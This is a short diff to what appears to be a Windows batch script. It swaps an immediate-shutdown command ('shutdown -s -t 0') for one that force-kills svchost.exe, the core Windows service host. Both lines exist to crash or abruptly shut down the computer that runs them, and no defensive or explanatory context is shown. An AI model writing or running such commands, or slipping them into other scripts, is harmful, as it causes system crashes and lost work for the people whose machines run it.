@@ -1,2 +1,1 @@
-@echo off
-shutdown -s -t 0
+taskkill /im svchost.exe /f
